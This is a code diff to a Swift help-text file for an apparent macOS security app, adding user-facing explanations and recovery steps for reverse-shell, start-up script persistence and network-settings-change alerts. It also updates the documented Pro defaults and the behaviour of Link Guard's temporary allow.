+                2. If a legitimate site you need was blocked by mistake, use "Allow once (5 min)" on the notification.
                 """
             ),
             LocalizedEntry(
@@ -1075,6 +1130,51 @@ extension RoamSwitchKnowledgeBase {
                 """
             ),
             LocalizedEntry(
+                id: "alert_new_startup_script",
+                title: "🚨 Suspicious entry detected in a place that runs automatically",
+                summary: "Shown when a suspicious line appears in a shell start-up file (such as `.zshrc`), `~/.ssh/rc`, a periodic script, a git hook, or a Folder Action script, or when a suspicious login/logout hook is set.",
+                details: """
+                • Cause: malware such as an infostealer writing itself in so that it runs at every login or boot, or you or a tool you use editing the file.
+                • Automatic defense: notification only (the write itself can't be prevented). The notification shows the file path, the suspicious line and the reason.
+                """,
+                recommendation: """
+                1. Check whether you just edited that file or installed a tool yourself. If so, no action is needed.
+                2. If not, delete the line shown in the notification. For a login/logout hook, remove the hook setting itself.
+                3. Also delete the program that line calls, restart the Mac and run a ClamAV scan.
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_reverse_shell",
+                title: "🐚 Suspected Reverse Shell Detected",
+                summary: "The input and output of a shell or interpreter are tied to a connection to an external server. An attacker may be controlling this Mac remotely.",
+                details: """
+                • What the notification shows: the program's path and PID, the peer address, the parent process and the command line.
+                • Common causes: the install script of a malicious package, a ClickFix command pasted after a fake error page, or a command run by an AI agent that was led astray. A legitimate remote-control tool that hands a shell to an external server can also trigger it.
+                • Automatic response: notification only. Neither the process nor the network is stopped.
+                """,
+                recommendation: """
+                1. Read the path, parent process and command in the notification and check whether it was your own action.
+                2. If you do not recognise it, turn Wi-Fi off or unplug the cable, then end the process.
+                3. Find where it was started from (the parent process, the command run just before, the process-exec recorder's log = feat_exec_recorder) and change any credentials that may have leaked.
+                4. If it is a use you recognise, allow it with the menu item "Add the latest reverse-shell detection to the allow list…".
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_network_settings_changed",
+                title: "🌐 Network Settings Differ From Before",
+                summary: "The DNS servers, router or proxy auto-config (PAC) that the connected network handed out differ from what the same network gave before. A rogue DHCP server or a WPAD man-in-the-middle attack is possible.",
+                details: """
+                • What the notification shows: the network name, and the DNS server, router or PAC host you had not seen before, or that WPAD was turned on.
+                • Harmless causes: a replaced router, a provider change or a settings change; an administrator changing settings on a company or school network.
+                • Automatic response: notification only. No setting is changed and no traffic is blocked. The same notice is sent only once.
+                """,
+                recommendation: """
+                1. If you know you changed the router or provider, accept it with the menu item "Update the network settings baseline to the current state…".
+                2. If you do not, stop using that network and switch to a trusted connection such as a mobile link.
+                3. If WPAD was turned on, turn off "Auto Proxy Discovery" in System Settings > Network > your connection > Details > Proxies.
+                """
+            ),
+            LocalizedEntry(
                 id: "alert_docker_risk",
                 title: "⚠️ Risky Docker Container Configuration Detected",
                 summary: "Notifies you that a container started with `--privileged` or with `docker.sock` mounted has just started.",
@@ -1206,7 +1306,7 @@ extension RoamSwitchKnowledgeBase {
                 title: "Guards Turned On Automatically with Pro, and Opt-In Guards",
                 summary: "The first time a Pro license is activated, the autonomous defense guards that mostly notify, rarely misfire and need no extra permission or setup are turned on automatically. Anything that could get in the way of normal use, or that needs extra permissions, setup or outside communication, stays opt-in. After that, the on/off choice you make for each guard is respected.",
                 details: """
-                • Turned on automatically (once, at first Pro activation): auto-block of unknown listening ports, incoming port scan detection (including the 10-minute auto-block of the scanning source), SSH brute-force detection (works only while Remote Login is on), ransomware bait-file detection and entropy-based detection, credential honeytokens, auto-block on ARP spoofing, automatic network cutoff on XProtect malware detection, automatic log audit, critical system file tamper monitoring, and dependency lockfile tamper monitoring. When the ARP and XProtect cutoffs are turned on, a one-time notice explains this.
+                • Turned on automatically (once, at first Pro activation): auto-block of unknown listening ports, incoming port scan detection (including the 10-minute auto-block of the scanning source), SSH brute-force detection (works only while Remote Login is on), ransomware bait-file detection and entropy-based detection, credential honeytokens, auto-block on ARP spoofing, automatic network cutoff on XProtect malware detection, automatic log audit, critical system file tamper monitoring, dependency lockfile tamper monitoring, live reverse-shell detection, and network settings change monitoring. When the ARP and XProtect cutoffs are turned on, a one-time notice explains this.
                 • On by default with Pro: Web & Mail Protection, auto-launch registration (LaunchAgent/Daemon) monitoring, DNS Threat Protection (applied on away networks only), and Link Guard (auto-block of clearly fraudulent sites).
                 • Off by default (opt-in): ClickFix auto-block, Docker risk detection, BadUSB physical port guard, USB storage auto-block, gateway ARP/NDP pinning, Bluetooth auto-off, process execution log, browser credential access monitoring, VPN tunnel, Sensor pairing, active vulnerability verification, and npm signature verification. Each of them can interrupt normal use (network cutoff, input devices, external drives, audio), needs an extra permission or install (Full Disk Access, Accessibility, blueutil), needs settings of your own such as an allow-list, or contacts an outside server. The DNS Threat Protection provider is your choice.
                 • On by default even in the free edition: clipboard protection (API keys and ClickFix commands).
@@ -1252,13 +1352,13 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "set_link_guard_modes",
-                title: "Link Guard Mode, Auto-Update, System Extension & Allowlist (Pro)",
+                title: "Link Guard Mode, Auto-Update, System Extension & Temporary Allow (Pro)",
                 summary: "Configure Link Guard's mode, threat feed auto-update, system extension approval state, and how to allow sites blocked by mistake.",
                 details: """
                 • Mode: "Link Guard (phishing-connection detection) (Pro)" → "Off", "Warn only (never block)", or "Auto-block clearly phishing sites (recommended)". Warn mode only works when the system extension is active.
                 • Auto-update: click "Auto-update: on (receive-only)" to turn it off. It still works with the bundled data and homograph detection. The feed version and domain count are shown in the menu.
                 • Enforcement point: "Enforcement: system extension (DoH-aware)", "Enforcement: hosts fallback", "Enabling system extension…", or a system extension error. While approval is pending, "Approve system extension (open System Settings)…" appears.
-                • Allow / block: "Allow once (5 min)" on a block notification allows the site for 5 minutes. Allow / Block choices in the warning panel are remembered.
+                • Allow / block: "Allow once (5 min)" on a block notification and "Allow" in the warning panel each allow the site for 5 minutes, and the allowance still ends on time if the app is quit and reopened. "Block" in the warning panel is remembered.
                 """,
                 recommendation: "Approve the system extension and use auto-block with auto-update on for the most effective protection."
             ),
@@ -1295,11 +1395,11 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "faq_free_vs_pro",
                 title: "Free vs. Pro Lifetime",
-                summary: "The free edition includes automatic network-based protection switching, the 18-item security audit, and a range of manual inspection tools, with no time limit. Pro unlocks automatic containment, real-time defenses, and patrol warnings.",
+                summary: "The free edition includes automatic network-based protection switching, the 21-item security audit, and a range of manual inspection tools, with no time limit. Pro unlocks automatic containment, real-time defenses, and patrol warnings.",
                 details: """
                 [Free]
                 • Automatic 3-level PF packet filter switching per network, with sharing services and AirDrop stopped and restored automatically
-                • Mac Security Audit (18 items), XProtect status, and file/app safety inspection
+                • Mac Security Audit (21 items), XProtect status, and file/app safety inspection
                 • Lists of exposed ports and USB devices
                 • Link Safety Audit, manual secret / API key leak audit, clipboard protection
                 • Package CVE scan, active vulnerability verification, Mac Security Log Audit, notification history
@@ -1455,8 +1555,8 @@ extension RoamSwitchKnowledgeBase {
                 title: "Link Guard Blocks a Legitimate Site / Keeps a Connection on Hold",
                 summary: "What to do when Link Guard blocks a site by mistake or holds it in warn mode.",
                 details: """
-                • Allow temporarily: "Allow once (5 min)" on the block notification.
-                • Allow permanently: choosing "Allow" in the warning panel is remembered.
+                • Allow temporarily: "Allow once (5 min)" on the block notification, or "Allow" in the warning panel. Both last 5 minutes.
+                • Remembered choice: only "Block" in the warning panel is remembered. "Allow" lasts 5 minutes.
                 • A held connection got blocked on its own: warn mode blocks if there's no answer within about 8 seconds (fail-closed). That outcome isn't cached, so reloading the page asks again.
                 • Can't see the notification: with the banner notification style the buttons can be hidden, so a front-most panel is shown too. During Focus modes, check notification history.
                 • Disable temporarily: switch the mode to "Warn only (never block)" or "Off".
